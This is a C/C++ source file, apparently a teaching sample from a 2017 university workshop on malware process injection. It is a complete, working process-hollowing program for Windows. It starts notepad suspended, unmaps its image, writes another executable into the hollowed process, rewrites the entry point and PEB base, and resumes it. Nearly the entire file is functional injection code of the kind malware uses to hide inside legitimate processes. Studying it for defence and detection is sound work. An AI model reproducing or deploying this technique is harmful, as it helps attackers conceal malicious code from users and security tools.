/*
 * Copyright (c) 2017
 *
 * This sample was developed by Ashkan Hosseini <ashkan.hosseini@.columbia.edu>
 * for malware process injection workshop at Columbia University in Nov 2017.
 *
 */

#include "stdafx.h"
#include <windows.h>
#include <winternl.h>

NTSTATUS(__stdcall *NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

int protect_remote_secs(HANDLE proc, void *base, const IMAGE_NT_HEADERS *snthdrs);

int CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{

	printf("Creating process\r\n");

	CONTEXT ctx;
	HANDLE hFile;
	PVOID image;
	PVOID base;
	PVOID mem;

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	DWORD dwBytesRead = 0;
	DWORD dwFileSize = 0;

	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	ctx.ContextFlags = CONTEXT_FULL;

	printf("Running the victim executable... \n");

	CreateProcessA
	(
			NULL,
			pDestCmdLine,
			NULL,
			NULL,
			NULL,
			CREATE_SUSPENDED,
			NULL,
			NULL,
			pStartupInfo,
			pProcessInfo
	);


	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\r\n");
		return 0;
	}


	hFile = CreateFileA
	(
			pSourceFile,
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			0,
			NULL
	);


	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("\n [x] Error creating process (%d) \n", GetLastError());
		TerminateProcess(pProcessInfo->hProcess, 1); // We failed, terminate the child process.
		return 0;
	}

	dwFileSize = GetFileSize(hFile, NULL); //Get the size of the malicious process
	image = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //allocate memory so we can load our malicious file into memory

	if (!ReadFile(hFile, image, dwFileSize, &dwBytesRead, NULL)) // Read the executable file from disk load it into the variable image.
	{
		printf("\n [x] Error from ReadFile. Failed reading the executable to memory (%d) \n", GetLastError());
		TerminateProcess(pProcessInfo->hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	CloseHandle(hFile); //now that image contains what we want we can close the handle to our malicious file

	pIDH = (PIMAGE_DOS_HEADER)image; //get the dos header of our malicious image

	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		printf("\n [x] Error: Invalid executable format.\n");
		TerminateProcess(pProcessInfo->hProcess, 1); // We failed, terminate the child process.
		return 1;
	}

	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS

	/*
	  We need to call GetThreadContext API to obtain the register values (thread context) of the supended process
	  The EBX register of the suspended process points to the proces's PEB, and the EAX register
	  contains the entry point of the process (first EXE).
	*/

	GetThreadContext(pProcessInfo->hThread, &ctx);

	//Read the base address of the victim/suspended process, and store it in the base variable.
	ReadProcessMemory
	(
			pProcessInfo->hProcess,
			(PVOID)(ctx.Ebx + 8),
			&base,
			sizeof(PVOID),
			NULL
	); 


	/*
	For process Hollowing it is important that either the preferred
	base address (assuming it has one) of the source image must match
    that of the destination image, or the source must contain a relocation table and the
    image needs to be rebased to the address of the destination.
	*/


	if ((DWORD)base == pINH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{
		printf("\nUnmapping original executable image from child process. Address: %#x\n", base);
		NtUnmapViewOfSection = (long(__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
		NtUnmapViewOfSection(pProcessInfo->hProcess, base); // Unmap the executable image using NtUnmapViewOfSection function
	}

	mem = VirtualAllocEx
    (
			pProcessInfo->hProcess,
			(PVOID)pINH->OptionalHeader.ImageBase,
			pINH->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
    );

	if (!mem)
	{
		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
		TerminateProcess(pProcessInfo->hProcess, 1); // We failed, terminate the child process.
		return 1;
	}


	printf("\n Succefully allocated memory at: %#x\n", mem);
	printf("\n Writing executable image into child process.\n");

	WriteProcessMemory(pProcessInfo->hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, NULL); // Write all the combined headers of the malicious executable into the victim process from the loaded image

    
	// Now it's time to write the malicious code into the hollow host process using WriteProcessMemory, section by section.
	for (DWORD i = 0; i < pINH->FileHeader.NumberOfSections; i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // e_lfanew is the offset to the IMAGE_NT_HEADERS structure in bytes
		WriteProcessMemory(pProcessInfo->hProcess, (PVOID)((LPBYTE)mem + pISH->VirtualAddress), (PVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL); // Write the remaining sections of the replacement executable into child process
	}
    
	/*
		The EBX register of the suspended process points to processe's PEB,
		and the EAX register contains the entry point of the process.
		So, we have to set the eax of the thread context to the entry point of the malicious process.
		TL;DR: Once the new image is loaded in memory the EAX register of the suspended thread is set to the entry point.
	*/
	

	if (protect_remote_secs(pProcessInfo->hProcess, mem, pINH)) {
		printf("Memory protected!\n");
	}


	ctx.Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint);
	printf("\nNew entry point: %#x\n", ctx.Eax);


	// Write the base address of the injected image into the PEB
	WriteProcessMemory(pProcessInfo->hProcess, (PVOID)(ctx.Ebx + 8), &pINH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);


	printf("\nSetting the context of the child process's primary thread.\n");

	// Set the thread context of the child process's primary thread
	if (!SetThreadContext(pProcessInfo->hThread, &ctx)) {
		printf("Error setting context \r \n");
		return 1;
	}
	

	printf("\nResuming child process's primary thread.\n");


	// Resume the primary thread
	if (!ResumeThread(pProcessInfo->hThread)) {
		printf("Error resuming thread \n");
		return 1;
	}

	printf("\nThread resumed.\n");

	// Wait until child process exits.
	WaitForSingleObject(pProcessInfo->hProcess, INFINITE);

	printf("\nProcess terminated.\n");

	// Close process and thread handles. 
	CloseHandle(pProcessInfo->hProcess);
	CloseHandle(pProcessInfo->hThread);

	// Free the allocated memory
	VirtualFree(image, 0, MEM_RELEASE); 
	VirtualFree(mem, 0, MEM_RELEASE);

	printf("File handles are closed and the memory is cleaned");
	return 0; 

}

int main(int argc, char* argv[])
{
	char* pPath = new char[MAX_PATH];
	char* victimProcess = "notepad";

	LPSTR* ptr = NULL;
	DWORD dwRet = SearchPath(NULL, "Magnify.exe", NULL, MAX_PATH, (LPSTR)pPath, ptr);

	CreateHollowedProcess
	(
		victimProcess,
		pPath
	);
	//system("pause");
	return 0;
}

// executable, readable, writable
DWORD secp2vmemp[2][2][2] = {
	{
		//not executable
		{ PAGE_NOACCESS, PAGE_WRITECOPY },
		{ PAGE_READONLY, PAGE_READWRITE }
	},
	{
		//executable
		{ PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY },
		{ PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE }
	}
};

DWORD secp_to_vmemp(DWORD secp)
{
	DWORD vmemp;
	int executable, readable, writable;

	executable = (secp & IMAGE_SCN_MEM_EXECUTE) != 0;
	readable = (secp & IMAGE_SCN_MEM_READ) != 0;
	writable = (secp & IMAGE_SCN_MEM_WRITE) != 0;
	vmemp = secp2vmemp[executable][readable][writable];
	if (secp & IMAGE_SCN_MEM_NOT_CACHED)
		vmemp |= PAGE_NOCACHE;
	return vmemp;
}

int protect_remote_secs(HANDLE proc, void *base, const IMAGE_NT_HEADERS *snthdrs)
{
	IMAGE_SECTION_HEADER *sec_hdr;
	DWORD old_prot, new_prot;
	WORD i;

	/* protect the PE headers */
	VirtualProtectEx(proc, base, snthdrs->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);

	/* protect the image sections */
	sec_hdr = (IMAGE_SECTION_HEADER *)(snthdrs + 1);
	for (i = 0; i < snthdrs->FileHeader.NumberOfSections; ++i) {
		void *section;
		section = (char *)base + sec_hdr[i].VirtualAddress;
		new_prot = secp_to_vmemp(sec_hdr[i].Characteristics);
		if (!VirtualProtectEx(proc,
			section,
			sec_hdr[i].Misc.VirtualSize,    /* pages affected in the range are changed */
			new_prot,
			&old_prot))
			return 0;
	}
	return 1;
}
